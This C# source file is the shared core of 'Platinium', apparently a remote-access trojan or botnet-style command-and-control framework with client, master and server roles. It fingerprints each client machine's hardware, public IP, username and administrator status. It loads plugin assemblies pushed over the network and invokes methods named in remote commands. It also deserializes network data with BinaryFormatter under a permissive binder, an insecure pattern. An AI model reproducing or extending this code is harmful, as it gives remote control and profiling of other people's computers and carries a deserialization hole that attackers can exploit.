using Platinium.Shared.Data.Packages;
using Platinium.Shared.Info;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.ComponentModel.Composition;
using System.ComponentModel.Composition.Hosting;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading.Tasks;
using System.Collections;
using System.Net;
using System.Runtime.Serialization;
using Platinium.Shared.Plugin;
using Platinium.Shared.Data.Structures;
using System.Threading;
using Platinium.Shared.Content;
using System.Reflection;
using System.Windows.Forms;
using System.Management;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Net.NetworkInformation;
using System.DirectoryServices.AccountManagement;
using System.Globalization;
using Platinium.Connection;

namespace Platinium
{
    namespace Shared
    {
        namespace Core
        {
            public partial class Converter
            {
                public static Dictionary<string, object> ClassToDictionary(object objectToConvert)
                {
                    return objectToConvert.GetType()
                         .GetProperties(BindingFlags.Instance | BindingFlags.Public)
                         .ToDictionary(prop => prop.Name, prop => prop.GetValue(objectToConvert, null));
                }
                public static List<Dictionary<string, object>> ClassToDictionaryList(List<object> objectListToConvert)
                {
                    List<Dictionary<string, object>> tempList = new List<Dictionary<string, object>>();
                    foreach (object objectToConvert in objectListToConvert)
                    {
                        tempList.Add(objectToConvert.GetType()
                         .GetProperties(BindingFlags.Instance | BindingFlags.Public)
                         .ToDictionary(prop => prop.Name, prop => prop.GetValue(objectToConvert, null)));
                    }
                    return tempList;
                }
            }
            public static class Extensions
            {
                public static string EmptyIfNull(this object value)
                {
                    if (value == null)
                    {
                        return "NULL";
                    }
                    return value.ToString();
                }
            }
            /// <summary>
            /// Generates a 16 byte Unique Identification code of a computer
            /// Example: 4876-8DB5-EE85-69D3-FE52-8CF7-395D-2EA9
            /// </summary>
            public class FingerPrint
            {
                private static string fingerPrint = string.Empty;
                public static string Value()
                {
                    if (string.IsNullOrEmpty(fingerPrint))
                    {
                        fingerPrint = GetHash("CPU >> " + cpuId() + "\nBIOS >> " + biosId() + "\nBASE >> " + baseId() + "\nMAC >> " + macId());
                    }
                    return fingerPrint;
                }
                private static string GetHash(string s)
                {
                    MD5 sec = new MD5CryptoServiceProvider();
                    ASCIIEncoding enc = new ASCIIEncoding();
                    byte[] bt = enc.GetBytes(s);
                    return GetHexString(sec.ComputeHash(bt));
                }
                private static string GetHexString(byte[] bt)
                {
                    string s = string.Empty;
                    for (int i = 0; i < bt.Length; i++)
                    {
                        byte b = bt[i];
                        int n, n1, n2;
                        n = (int)b;
                        n1 = n & 15;
                        n2 = (n >> 4) & 15;
                        if (n2 > 9)
                            s += ((char)(n2 - 10 + (int)'A')).ToString();
                        else
                            s += n2.ToString();
                        if (n1 > 9)
                            s += ((char)(n1 - 10 + (int)'A')).ToString();
                        else
                            s += n1.ToString();
                        if ((i + 1) != bt.Length && (i + 1) % 2 == 0) s += "-";
                    }
                    return s;
                }
                #region Original Device ID Getting Code
                //Return a hardware identifier
                private static string identifier
                (string wmiClass, string wmiProperty, string wmiMustBeTrue)
                {
                    string result = "";
                    ManagementClass mc =
                new ManagementClass(wmiClass);
                    ManagementObjectCollection moc = mc.GetInstances();
                    foreach (ManagementObject mo in moc)
                    {
                        if (mo[wmiMustBeTrue].ToString() == "True")
                        {
                            //Only get the first one
                            if (result == "")
                            {
                                try
                                {
                                    result = mo[wmiProperty].ToString();
                                    break;
                                }
                                catch
                                {
                                }
                            }
                        }
                    }
                    return result;
                }
                //Return a hardware identifier
                private static string identifier(string wmiClass, string wmiProperty)
                {
                    string result = "";
                    ManagementClass mc =
                new ManagementClass(wmiClass);
                    ManagementObjectCollection moc = mc.GetInstances();
                    foreach (ManagementObject mo in moc)
                    {
                        //Only get the first one
                        if (result == "")
                        {
                            try
                            {
                                result = mo[wmiProperty].ToString();
                                break;
                            }
                            catch
                            {
                            }
                        }
                    }
                    return result;
                }
                private static string cpuId()
                {
                    //Uses first CPU identifier available in order of preference
                    //Don't get all identifiers, as it is very time consuming
                    string retVal = identifier("Win32_Processor", "UniqueId");
                    if (retVal == "") //If no UniqueID, use ProcessorID
                    {
                        retVal = identifier("Win32_Processor", "ProcessorId");
                        if (retVal == "") //If no ProcessorId, use Name
                        {
                            retVal = identifier("Win32_Processor", "Name");
                            if (retVal == "") //If no Name, use Manufacturer
                            {
                                retVal = identifier("Win32_Processor", "Manufacturer");
                            }
                            //Add clock speed for extra security
                            retVal += identifier("Win32_Processor", "MaxClockSpeed");
                        }
                    }
                    return retVal;
                }
                //BIOS Identifier
                private static string biosId()
                {
                    return identifier("Win32_BIOS", "Manufacturer")
                    + identifier("Win32_BIOS", "SMBIOSBIOSVersion")
                    + identifier("Win32_BIOS", "IdentificationCode")
                    + identifier("Win32_BIOS", "SerialNumber")
                    + identifier("Win32_BIOS", "ReleaseDate")
                    + identifier("Win32_BIOS", "Version");
                }
                //Main physical hard drive ID
                private static string diskId()
                {
                    return identifier("Win32_DiskDrive", "Model")
                    + identifier("Win32_DiskDrive", "Manufacturer")
                    + identifier("Win32_DiskDrive", "Signature")
                    + identifier("Win32_DiskDrive", "TotalHeads");
                }
                //Motherboard ID
                private static string baseId()
                {
                    return identifier("Win32_BaseBoard", "Model")
                    + identifier("Win32_BaseBoard", "Manufacturer")
                    + identifier("Win32_BaseBoard", "Name")
                    + identifier("Win32_BaseBoard", "SerialNumber");
                }
                //Primary video controller ID
                private static string videoId()
                {
                    return identifier("Win32_VideoController", "DriverVersion")
                    + identifier("Win32_VideoController", "Name");
                }
                //First enabled network card ID
                private static string macId()
                {
                    return identifier("Win32_NetworkAdapterConfiguration",
                        "MACAddress", "IPEnabled");
                }
                #endregion
            }
            public class CFunctions
            {
                public static bool IsAdministrator()
                {
                    WindowsIdentity identity = WindowsIdentity.GetCurrent();
                    WindowsPrincipal principal = new WindowsPrincipal(identity);
                    return principal.IsInRole(WindowsBuiltInRole.Administrator);
                }
                public static string GetPublicIP()
                {
                    return new WebClient().DownloadString(@"http://icanhazip.com").Trim();
                }
                public static string GetMacAddress()
                {
                    return (from nic in NetworkInterface.GetAllNetworkInterfaces()
                            where nic.OperationalStatus == OperationalStatus.Up
                            select nic.GetPhysicalAddress().ToString()).FirstOrDefault();
                }
                public static string GetCurrentLoggedUser()
                {
                    string ret = WindowsIdentity.GetCurrent().Name;
                    return ret;
                }
                public static string GetComputerName()
                {
                    return Dns.GetHostName();
                }
                public static string GetCurrentCulture()
                {
                    return CultureInfo.CurrentCulture.TwoLetterISOLanguageName;
                }
                public static string GetAppNetVersion()
                {
                    return Assembly.GetExecutingAssembly().GetReferencedAssemblies().Where(x => x.Name == "System.Core").First().Version.ToString();
                }
                public static string GetOSName()
                {
                    var name = (from x in new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem").Get().Cast<ManagementObject>()
                                select x.GetPropertyValue("Caption")).FirstOrDefault();
                    return name != null ? name.ToString() : "Unknown";
                }
            }
        }
        namespace Content
        {
            public enum PackageType
            {
                Base,
                Data,
                PluginCommand,
                Status,
                NoResponse,
                Response
            }
            [Serializable]
            public class Command
            {
                public string Type { get; set; }
                public string CommandContent { get; set; }
                public Command()
                {

                }
                public Command(string type, string command)
                {
                    Type = type;
                    CommandContent = command;
                }
            }
        }
        namespace Plugin
        {
            /// <summary>
            /// The IPlugin Interface.
            /// </summary>
            public interface IPlugin
            {
                void Action();
                void InstantiateClient();
                void InstantiateMaster();
                IPluginClientController ClientController { get; set; }
                IPluginMasterController MasterController { get; set; }
                UserControlModule PluginInterfaceControl { get; set; }
            }
            public interface IPluginClientController
            {
                Package Action(Package inPackage);
            }
            public interface IPluginMasterController
            {
                Package Action(Package inPackage);
            }
            public class Metadata : Attribute
            {
                public string Name { get; set; }
                public string Version { get; set; }
                public string Description { get; set; }
            }
            public partial class PluginFactory
            {
                public static Package HandlePluginMethods(Package inPackage, BaseInfoType baseInfoType)
                {
                    Package returnPackage = inPackage;
                    string[] commands = inPackage.Command.Split('|');
                    string plugin_name = commands[0];
                    string plugin_command = commands[1];
                    object[] command_parameters = { inPackage };
                    Type type = null;
                    if (baseInfoType == BaseInfoType.Client)
                    {
                        type = DataStructure.PluginDictionary.Where(l => l.Key.Name.Equals(plugin_name)).Select(l => l.Value).FirstOrDefault().ClientController.GetType();
                    }
                    else if (baseInfoType == BaseInfoType.Master)
                    {
                        type = DataStructure.PluginDictionary.Where(l => l.Key.Name.Equals(plugin_name)).Select(l => l.Value).FirstOrDefault().MasterController.GetType();
                    }

                    if (type != null)
                    {
                        MethodInfo methodInfo = type.GetMethod(plugin_command);
                        if (methodInfo != null)
                        {
                            ParameterInfo[] parameters = methodInfo.GetParameters();
                            IPlugin pluginInstance = DataStructure.PluginDictionary.Where(l => l.Key.Name.Equals(plugin_name)).Select(l => l.Value).FirstOrDefault();

                            if (parameters.Length == 0)
                            {
                                if (baseInfoType == BaseInfoType.Client)
                                {
                                    returnPackage = (Package)methodInfo.Invoke(pluginInstance.ClientController, null);
                                }
                                else if (baseInfoType == BaseInfoType.Master)
                                {
                                    returnPackage = (Package)methodInfo.Invoke(pluginInstance.MasterController, null);
                                }
                            }
                            else
                            {
                                if (baseInfoType == BaseInfoType.Client)
                                {
                                    returnPackage = (Package)methodInfo.Invoke(pluginInstance.ClientController, command_parameters.ToArray());
                                }
                                else if (baseInfoType == BaseInfoType.Master)
                                {
                                    returnPackage = (Package)methodInfo.Invoke(pluginInstance.MasterController, command_parameters.ToArray());
                                }
                            }
                        }
                    }
                    return returnPackage;
                }
            }
        }
        namespace Data
        {
            namespace Packages
            {
                public class PackageFactory
                {
                    public static Package HandleServerPackages(Package inPackage)
                    {
                        Package returnPackage = new Package(null, null, PackageType.Response, inPackage.To, inPackage.From);
                        switch (inPackage.PackageType)
                        {
                            case PackageType.Base:
                                returnPackage = inPackage;
                                break;
                            case PackageType.Data:
                                switch (inPackage.Command)
                                {
                                    case "LOAD_PLUGINS":
                                        returnPackage = new Package("LOAD_PLUGINS", DataStructure.AssemblyRaw, PackageType.Data, inPackage.To, inPackage.From);
                                        break;
                                    case "CLIENT_LIST":
                                        returnPackage = new Package("CLIENT_LIST", DataStructure.ClientList, PackageType.Data, inPackage.To, inPackage.From);
                                        break;
                                    default:
                                        break;
                                }
                                break;
                            case PackageType.PluginCommand:
                                returnPackage = inPackage;
                                break;
                            case PackageType.Status:
                                break;
                            case PackageType.NoResponse:
                                break;
                            case PackageType.Response:
                                break;
                            default:
                                break;
                        }
                        return returnPackage;
                    }
                    public static Package HandleClientPackages(Package inPackage)
                    {
                        Package returnPackage = new Package(null, null, PackageType.Response, inPackage.To, new ClientInfo(BaseInfoType.Server));
                        switch (inPackage.PackageType)
                        {
                            case PackageType.Base:
                                returnPackage = inPackage;
                                break;
                            case PackageType.Data:
                                switch (inPackage.Command)
                                {
                                    case "LOAD_PLUGINS":
                                        DataStructure.AssemblyRaw = (List<byte[]>)inPackage.Content;
                                        Console.WriteLine("LOADED ASSEMBLIES");
                                        foreach (var assemblyData in DataStructure.AssemblyRaw)
                                        {
                                            Assembly assembly = Assembly.Load(assemblyData);
                                            DataStructure.LoadedAssemblyList.Add(assembly);
                                        }
                                        Type pluginType = typeof(IPlugin);
                                        ICollection<Type> pluginTypes = new List<Type>();
                                        foreach (Assembly assembly in DataStructure.LoadedAssemblyList)
                                        {
                                            Type[] types = assembly.GetTypes();
                                            foreach (Type type in types)
                                            {
                                                if (!type.IsInterface || !type.IsAbstract)
                                                {
                                                    if ((type.GetInterface(pluginType.FullName) != null) && (!type.IsInterface || !type.IsAbstract))
                                                    {
                                                        pluginTypes.Add(type);
                                                    }
                                                }
                                            }
                                        }
                                        foreach (Type type in pluginTypes)
                                        {
                                            IPlugin plugin = (IPlugin)Activator.CreateInstance(type);
                                            var pluginMetadata = (Metadata[])type.GetCustomAttributes(typeof(Metadata), true);
                                            DataStructure.PluginDictionary.Clear();
                                            DataStructure.PluginDictionary.Add(pluginMetadata[0], plugin);
                                            plugin.InstantiateClient();
                                        }
                                        break;
                                    default:
                                        break;
                                }
                                break;
                            case PackageType.PluginCommand:
                                returnPackage = PluginFactory.HandlePluginMethods(inPackage, BaseInfoType.Client);
                                break;
                            case PackageType.Status:
                                break;
                            case PackageType.NoResponse:
                                break;
                            case PackageType.Response:
                                break;
                            default:
                                break;
                        }
                        return returnPackage;
                    }
                    public static Package HandleMasterPackages(Package inPackage)
                    {
                        Package returnPackage = inPackage;
                        switch (inPackage.PackageType)
                        {
                            case PackageType.Base:
                                returnPackage = inPackage;
                                break;
                            case PackageType.Data:
                                switch (inPackage.Command)
                                {
                                    case "LOAD_PLUGINS":
                                        DataStructure.AssemblyRaw = (List<byte[]>)inPackage.Content;
                                        Console.WriteLine("LOADED ASSEMBLIES");
                                        foreach (var assemblyData in DataStructure.AssemblyRaw)
                                        {
                                            Assembly assembly = Assembly.Load(assemblyData);
                                            DataStructure.LoadedAssemblyList.Add(assembly);
                                        }
                                        Type pluginType = typeof(IPlugin);
                                        ICollection<Type> pluginTypes = new List<Type>();
                                        foreach (Assembly assembly in DataStructure.LoadedAssemblyList)
                                        {
                                            Type[] types = assembly.GetTypes();
                                            foreach (Type type in types)
                                            {
                                                if (!type.IsInterface || !type.IsAbstract)
                                                {
                                                    if ((type.GetInterface(pluginType.FullName) != null) && (!type.IsInterface || !type.IsAbstract))
                                                    {
                                                        pluginTypes.Add(type);
                                                    }
                                                }
                                            }
                                        }
                                        foreach (Type type in pluginTypes)
                                        {
                                            IPlugin plugin = (IPlugin)Activator.CreateInstance(type);
                                            var pluginMetadata = (Metadata[])type.GetCustomAttributes(typeof(Metadata), true);
                                            MethodInfo[] methodInfo = type.GetMethods(BindingFlags.Public | BindingFlags.Instance);
                                            DataStructure.PluginDictionary.Clear();
                                            DataStructure.PluginMethodDictionary.Clear();
                                            DataStructure.PluginDictionary.Add(pluginMetadata[0], plugin);
                                            DataStructure.PluginMethodDictionary.Add(pluginMetadata[0], methodInfo);
                                            plugin.InstantiateMaster();
                                        }
                                        break;
                                    case "CLIENT_LIST":
                                        DataStructure.ClientList = (List<ClientInfo>)inPackage.Content;
                                        break;
                                    default:
                                        break;
                                }
                                break;
                            case PackageType.PluginCommand:
                                returnPackage = PluginFactory.HandlePluginMethods(inPackage, BaseInfoType.Master);
                                break;
                            case PackageType.Status:
                                break;
                            case PackageType.NoResponse:
                                break;
                            case PackageType.Response:
                                break;
                            default:
                                break;
                        }
                        return returnPackage;
                    }
                }
                [Serializable]
                public class Package
                {
                    public ClientInfo To { get; private set; }
                    public ClientInfo From { get; private set; }
                    public string Command { get; private set; }
                    public object Content { get; private set; }
                    public PackageType PackageType { get; private set; }
                    public Package(string command, object obj, PackageType packagetype, ClientInfo from, ClientInfo to)
                    {
                        Command = command;
                        To = to;
                        PackageType = packagetype;
                        From = from;
                        Content = obj;
                    }
                    public Package(string command, object obj, PackageType packagetype, ClientInfo from)
                    {
                        Command = command;
                        From = from;
                        Content = obj;
                        PackageType = packagetype;
                    }
                }
                [Serializable]
                public class TransportPackage
                {
                    public byte[] Data = new byte[1048576];
                    public TransportPackage()
                    {

                    }
                    public TransportPackage(byte[] data)
                    {
                        Data = data;
                    }
                }
            }
            namespace Serialization
            {
                sealed class AllowAllAssemblyVersionsDeserializationBinder : SerializationBinder
                {
                    public override Type BindToType(string assemblyName, string typeName)
                    {
                        Type typeToDeserialize = null;

                        String currentAssembly = Assembly.GetExecutingAssembly().FullName;

                        // In this case we are always using the current assembly
                        assemblyName = currentAssembly;

                        // Get the type using the typeName and assemblyName
                        typeToDeserialize = Type.GetType(String.Format("{0}, {1}",
                            typeName, assemblyName));

                        return typeToDeserialize;
                    }
                }
                public class Serializer
                {
                    public static TransportPackage Serialize(object objToSerialize)
                    {
                        using (var memoryStream = new MemoryStream())
                        {
                            BinaryFormatter bf = new BinaryFormatter();
                            bf.Binder = new AllowAllAssemblyVersionsDeserializationBinder();
                            (bf).Serialize(memoryStream, objToSerialize);
                            return new TransportPackage(memoryStream.ToArray());
                        }
                    }
                    public static object Deserialize(TransportPackage package)
                    {
                        using (var memoryStream = new MemoryStream(package.Data))
                        {
                            BinaryFormatter bf = new BinaryFormatter();
                            bf.Binder = new AllowAllAssemblyVersionsDeserializationBinder();
                            memoryStream.Seek(0, SeekOrigin.Begin);
                            return (bf).Deserialize(memoryStream);
                        }
                    }
                    public static byte[] SerializeToByte(object objToSerialize)
                    {
                        using (var memoryStream = new MemoryStream())
                        {
                            (new BinaryFormatter()).Serialize(memoryStream, objToSerialize);
                            return memoryStream.ToArray();
                        }
                    }
                    public static object DeserializeFromByte(byte[] data)
                    {
                        using (var memoryStream = new MemoryStream(data))
                        {
                            BinaryFormatter bf = new BinaryFormatter();
                            bf.Binder = new AllowAllAssemblyVersionsDeserializationBinder();
                            return (bf).Deserialize(memoryStream);
                        }
                    }
                }
            }
            namespace Structures
            {
                [Serializable]
                public static class DataStructure
                {
                    public static List<ClientInfo> MasterList = new List<ClientInfo>();
                    public static List<ClientInfo> ClientList = new List<ClientInfo>();
                    public static Dictionary<Metadata, IPlugin> PluginDictionary = new Dictionary<Metadata, IPlugin>();
                    public static Dictionary<Metadata, MethodInfo[]> PluginMethodDictionary = new Dictionary<Metadata, MethodInfo[]>();
                    public static List<byte[]> AssemblyRaw = new List<byte[]>();
                    public static List<Assembly> LoadedAssemblyList = new List<Assembly>();
                }
            }
        }
        namespace Info
        {
            public enum BaseInfoType
            {
                Client,
                Master,
                Server
            }
            [Serializable]
            public class ClientInfo : IEnumerable<object>
            {
                public string IP { get; set; }
                public string MACAddress { get; set; }
                public string UserName { get; set; }
                public string ComputerName { get; set; }
                public string UID { get; set; }
                public string Language { get; set; }
                public bool IsAdministrator { get; set; }
                public string OSName { get; set; }
                public double AppVersion { get; private set; }
                public string AppNetVersion { get; set; }
                public bool IsConnected { get; set; } = false;

                public BaseInfoType Type { get; set; }
                [NonSerialized]
                private Connector _connector;
                public Connector Connector { get { return _connector; } set { _connector = value; } }
                public ClientInfo()
                {
                    AppVersion = 1.0;
                }
                public ClientInfo(string uid, BaseInfoType type)
                {
                    AppVersion = 1.0;
                    UID = uid;
                    Type = type;
                }
                public ClientInfo(string uid)
                {
                    AppVersion = 1.0;
                    UID = uid;
                    Type = BaseInfoType.Client;
                }
                public ClientInfo(BaseInfoType type)
                {
                    AppVersion = 1.0;
                    Type = type;
                }
                private IEnumerable<object> Info()
                {
                    yield return IP;
                    yield return MACAddress;
                    yield return UserName;
                    yield return ComputerName;
                    yield return OSName;
                    yield return AppVersion;
                    yield return AppNetVersion;
                    yield return IsAdministrator;
                    yield return UID;
                    yield return Language;
                    yield return Type;
                }
                public IEnumerator<object> GetEnumerator()
                {
                    return Info().GetEnumerator();
                }
                IEnumerator IEnumerable.GetEnumerator()
                {
                    return GetEnumerator();
                }
            }
        }
    }
}
